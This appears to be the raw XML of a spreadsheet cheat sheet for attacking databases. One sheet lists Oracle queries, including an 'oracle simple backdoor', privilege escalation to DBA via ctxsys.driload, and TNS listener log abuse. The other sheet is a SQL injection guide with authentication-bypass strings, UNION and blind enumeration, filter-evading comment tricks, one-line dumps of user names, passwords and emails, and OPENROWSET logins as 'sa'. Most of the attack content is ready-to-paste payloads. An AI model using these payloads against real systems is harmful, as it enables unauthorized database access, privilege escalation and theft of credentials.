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290.24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322.64pt"/>
    </style:style>
    <style:style style:name="co8"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28.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro4" style:family="table-row">
      <style:table-row-properties style:row-height="55.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro5" style:family="table-row">
      <style:table-row-properties style:row-height="37.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro6" style:family="table-row">
      <style:table-row-properties style:row-height="82.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro7" style:family="table-row">
      <style:table-row-properties style:row-height="461.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro8" style:family="table-row">
      <style:table-row-properties style:row-height="26.79pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro9" style:family="table-row">
      <style:table-row-properties style:row-height="19.7pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro10" style:family="table-row">
      <style:table-row-properties style:row-height="153.69pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro11" style:family="table-row">
      <style:table-row-properties style:row-height="145.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro12" style:family="table-row">
      <style:table-row-properties style:row-height="64.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro13" style:family="table-row">
      <style:table-row-properties style:row-height="308.24pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro14" style:family="table-row">
      <style:table-row-properties style:row-height="91.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro15" style:family="table-row">
      <style:table-row-properties style:row-height="46.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro16" style:family="table-row">
      <style:table-row-properties style:row-height="109.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro17" style:family="table-row">
      <style:table-row-properties style:row-height="19.39pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro18" style:family="table-row">
      <style:table-row-properties style:row-height="28.35pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro19" style:family="table-row">
      <style:table-row-properties style:row-height="21.74pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro20" style:family="table-row">
      <style:table-row-properties style:row-height="263.25pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro21" style:family="table-row">
      <style:table-row-properties style:row-height="217.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro22" style:family="table-row">
      <style:table-row-properties style:row-height="100.49pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro23" style:family="table-row">
      <style:table-row-properties style:row-height="73.5pt" fo:break-before="auto" style:use-optimal-row-height="true"/>
    </style:style>
    <style:style style:name="ro24" style:family="table-row">
      <style:table-row-properties style:row-height="154.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7" style:family="table-cell" style:parent-style-name="Default">
      <style:table-cell-properties fo:wrap-option="wrap"/>
      <style:text-properties style:font-name="Liberation Seri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size-complex="10pt" style:font-relief="none" style:font-style-complex="normal" style:font-weight-complex="normal" style:font-name-complex="Noto Sans Devanagari" style:language-complex="hi" style:country-complex="IN" fo:language="en" fo:country="US" fo:text-shadow="none" fo:font-style="normal" style:text-underline-style="none" style:text-underline-color="font-color" fo:font-size="10pt" style:font-name="Liberation Serif"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6"/>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>scheduled jobs</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT job from USER_JOBS;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>what does a job do</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>AUDIT_TRAIL=DB (or FS to save on file system)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>check if audit_trail is enabled</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name, value from v$parameter where name like ‘%audit_trail%’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT o.name from sys.obj$ o, sys.tab$ t where t.audit$ like ‘%A%’ and o.obj#=t .obj#;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list the audited table and the audited action (select/update/etc)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from DBA_AUDIT_POLICIES;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>check which objects are audited whith FGA</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>DBA_FGA_AUDIT_TRAIL</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>list all the stored procedure and their owner</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT OWNER, object_name, object_type FROM dba_obj_audit_opts where object_type=’PROCEDURE’;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To list all the active trigger</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>create table xxx.yyy as SELECT * from old.table;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Copy table from foreign host to here</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>SET PAGESIZE 66;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To give all java permission (read,write,execute) to a user</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>exec dbms_java.grant_permission(‘oracle_user’, ‘SYS:java.io.FilePermission’, ‘&lt;&lt;ALL FILES&gt;&gt;’, ‘execute’);</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To extract a single choosed record from a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TNAME from (SELECT TNAME,ROWNUM as rn from tab) where rn=’2′;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To list top n rows of a table in order</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * FROM (SELECT * FROM t ORDER BY c) WHERE ROWNUM &lt;= n;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To view the oracle version</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>set escape \</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show the IP address of the db server</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT SYS_CONTEXT(‘USERENV’, ‘IP_ADDRESS’, 15) ipaddr from dual;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To show the HOSTNAME of the db server</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>SELECT * from user_sys_privs;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>oracle simple backdoor (hey gippo, really thank you!)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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 office:value-type="string" calcext:value-type="string">
            <text:p>Grant “privilege” to “user”;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>grant privileges on object to user;  (use public for any) eg. grant SELECT, insert, update, delete on suppliers to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a table</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>revoke privileges on object from user; eg. revoke delete on suppliers from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To grant privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>grant execute on object to user; (use public for any) eg. grant execute on Find_Value to smithj;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To discover all the functions with public execute grant</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To revoke privileges on a function or a procedure</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>revoke execute on object from user; eg. revoke execute on Find_Value from anderson;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To write a file abusing the tns listener log file using tnscmd.pl</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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6">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To open a http connection somewhere</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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2">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>To escalate privileges from user: OUTLN BACKUP</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>exec ctxsys.driload.validate_stmt(‘grant dba to user’); exec dbms_repcat_admin.grant_admin_any_schema(‘user’)’</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>to become a user without knowing his password</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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5">
          <table:table-cell table:style-name="ce1" office:value-type="string" calcext:value-type="string">
            <text:p>Functions useful for Blind SQL Injetion</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce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7">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ext:p>DATABASE_COMPATIBLE_LEVEL</text:p>
            <text:p>DBA_DB_LINKS</text:p>
            <text:p>DBA_ERRORS</text:p>
            <text:p>DBA_OBJECTS</text:p>
            <text:p>DBA_ROLES</text:p>
            <text:p>DBA_ROLE_PRIVS</text:p>
            <text:p>DBA_SOURCE</text:p>
            <text:p>DBA_TABLESPACES</text:p>
            <text:p>DBA_TAB_PRIVS</text:p>
            <text:p>DBA_TRIGGERS</text:p>
            <text:p>DBA_TS_QUOTAS</text:p>
            <text:p>DBA_USERS</text:p>
            <text:p>DBA_VIEWS</text:p>
            <text:p>DICTIONARY</text:p>
            <text:p>DICT_COLUMNS</text:p>
            <text:p>GLOBAL_NAME</text:p>
            <text:p>NLS_DATABSE_PARAMETERS</text:p>
            <text:p>NLS_INSTANCE_PARAMETERS</text:p>
            <text:p>NLS_SESSION_PARAMETERS</text:p>
            <text:p>PRODUCT_COMPONENT_VERSION</text:p>
            <text:p>ROLE_TAB_PRIVS</text:p>
            <text:p>SESSION_PRIVS</text:p>
            <text:p>SESSION_ROLES</text:p>
            <text:p>SYSTEM_PRIVILEGE_MAP</text:p>
            <text:p>TABLE_PRIVILEGES</text:p>
            <text:p>TABLE_PRIVILEGE_MAP</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="1048520">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6"/>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>1 – Standard SQL injection (not blind)</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.1 – Information gathering</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server version:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select @@version) –</text:p>
            <text:p>VERSION()</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get server name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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7" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select USER_NAME()) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get current database name:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR 1 in (select DB_NAME()) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro10">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>typical SQLi test (auth bypass), test in user field, pass field, and both together</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1=’1</text:p>
            <text:p>1’ or 1=1 –</text:p>
            <text:p>' or ‘1’=’1</text:p>
            <text:p>' or ‘ 1=1</text:p>
            <text:p>1 OR 1=1</text:p>
            <text:p>' or 1=1 --</text:p>
            <text:p>a' or 1=1 --</text:p>
            <text:p>" or 1=1 --</text:p>
            <text:p>a" or 1=1 --</text:p>
            <text:p>' or 1=1 #</text:p>
            <text:p>" or 1=1 #</text:p>
            <text:p>or 1=1 --</text:p>
            <text:p>' or 'x'='x</text:p>
            <text:p>" or "x"="x</text:p>
            <text:p>') or ('x'='x</text:p>
            <text:p>") or ("x"="x</text:p>
            <text:p>' or username LIKE '%admin% </text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Additional info with LIKE</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 or 1=1 AND user LIKE “%root%”</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Comment obfuscation</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 o/**/r 1=1 A/**/ND user L/**/IKE "%root%"</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro11">
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p>Check for privs</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" calcext:value-type="string">
            <text:p><text:span text:style-name="T1">SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges; </text:span></text:p>
            <text:p/>
            <text:p><text:span text:style-name="T1">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1">SELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges; — list privs on databases (schemas)SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;</text:span></text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro1" table:number-rows-repeated="2">
          <table:table-cell table:style-name="ce4" table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">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2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>MSSQL is a very friendly database… you can get all db structures via normal select. Fist of all you can take the list of databases on the server.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Get all records we need to implement something in sql like the limit keyword on mysql ($XX$ is the row number):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">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4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT TOP 1 name FROM (SELECT TOP 1 name FROM (SELECT TOP $XX$ name FROM master..sysdatabases ORDER BY name ASC) as foo ORDER by name DESC) as foo ORDER by name DESC</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro12">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>You can test this syntax with (“or 1 in” on the first query will return always the same result, so we will use “or 1 =”):</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get numeric data we need to convert them to strings and append a non numeric char, otherwise the sql server will do an automatic cast.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select CONVERT(varchar(255),dbid)+'$' from master..sysdatabases) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and we can append data to get results faster</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 = (SELECT CONVERT(varchar(255),dbid)+'$'+name FROM master..sysdatabases T1 WHERE ((SELECT COUNT(*) FROM master..sysdatabases T2 WHERE T2.name &amp;lt;= T1.name) = $XX$)) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4"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4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and this one will return all non primary keys.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>So you can build the database structures using this query:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or using this (simple) one:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Now we can download the primary keys columns ($XX$ is the number of the row) the $ will be the deliminator</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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6">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>and the other columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.3 – Dumping the data</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4"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5">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>or you can get it on a single query with:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select '$'+convert(varchar(255),username)+'$'+convert(varchar(255),userpass)+'$'+convert(varchar(255),usermail)from users where userid = $XX$) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>1’ UNION SELECT 1,version@@,3,4 –</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of tables</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>UNION list of columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Concat 2 columns</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION SELECT 1,concat(table_name,’:’,column_name),3,4 FROM information_schema.columns</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>using ORDER BY</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>SELECT COUNT(*) FROM tablename</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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3">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1" table:number-rows-repeated="2">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>1.4 – Privilege escalation with OPENROWSET</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">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4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =0')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">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4" office:value-type="string" calcext:value-type="string">
            <text:p>' or 1 in (select name from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select name from master..sysusers where uid =''0''')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Remember the escape character in MSSQL is ” so, if you need some ‘ on the query in the openrowset you need to use them double like:</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p> </text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>2 – Blind sql injection</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.a Feel around</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro15">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>First of all you have to identify a way to get different results with injecting your data, for example:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and 1=1 –</text:p>
            <text:p>1 and 1=2 –</text:p>
            <text:p>1 &amp;&amp; 1;</text:p>
            <text:p>1 || 1;</text:p>
            <text:p>1 XOR 0;</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Another interesting way can be use sql optimizations to get an error if the last part of the query is correct.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>1\'1</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro5">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4"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4"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4" office:value-type="string" calcext:value-type="string">
            <text:p>' OR username IS NOT NULL OR username = '</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Finding user supplied tables using the sysObjects table in SQL Server:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 UNION ALL SELECT 1,2,3,4,5,6,name FROM sysObjects WHERE xtype = 'U' --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">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number-rows-repeated="2">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro9">
          <table:table-cell table:style-name="ce3" office:value-type="string" calcext:value-type="string">
            <text:p>2.b Brute</text:p>
          </table:table-cell>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro3">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2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>To get the data using this response differences we can use the keyword like:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1 and (1 &amp;lt;= (SELECT COUNT(*) FROM master..sysdatabases WHERE master..sysdatabases.name LIKE 'm%')) --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro16">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4"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11">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4"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2">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4" office:value-type="string" calcext:value-type="string">
            <text:p>1' AND 1=(SELECT COUNT(*) FROM tablenames); --</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro3">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4" office:value-type="string" calcext:value-type="string">
            <text:p>1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) &gt; 116</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row table:style-name="ro4">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>Extract hashes using BENCHMARK, (one char at a time)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"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15">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2">
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>As described with the standard sql injection you can get table structures and data. So build your own sql blind bruteforce script.</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4"/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:style-name="ce4"/>
          <table:table-cell/>
        </table:table-row>
        <table:table-row table:style-name="ro1">
          <table:table-cell table:number-columns-repeated="2"/>
        </table:table-row>
        <table:table-row table:style-name="ro8">
          <table:table-cell table:style-name="ce2" office:value-type="string" calcext:value-type="string">
            <text:p>3 – Compatibility issues</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="ce4" office:value-type="string" calcext:value-type="string">
            <text:p>1' ; use master; select * from OPENROWSET('SQLOLEDB', ''; 'sa'; 'password', 'select 1') --</text:p>
          </table:table-cell>
        </table:table-row>
